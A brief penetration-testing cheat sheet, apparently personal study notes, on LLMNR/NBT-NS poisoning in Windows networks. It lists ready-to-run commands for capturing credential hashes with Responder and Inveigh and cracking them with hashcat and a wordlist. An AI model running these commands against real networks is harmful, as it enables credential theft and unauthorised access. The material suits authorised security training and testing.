- [ ] LLMNR/NBT-NS Poisonning from Linux Box
```
LLMNR: udp port 5355 link local multicast name resolution
NBT-NS: udp 137  Netbios name resolution
DNS -> LLMNR  -> NBT-NS
```
Responder!!!!
```sh
responder -I ens224
```
Craking!!!!
```sh
hashcat -m 5600 -a 0 responder.hash /usr/share/wordlist/rockyou.txt
```
- [ ] LLMNR/NBT-NS Poisonning from Windows Box
Inveigh Wiki!!!!
```
https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters
```
Powershell Inveigh!!!
```powershell
Import-Module Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
C# Inveigh!!!!
```powershell
.\Inveigh.exe
```

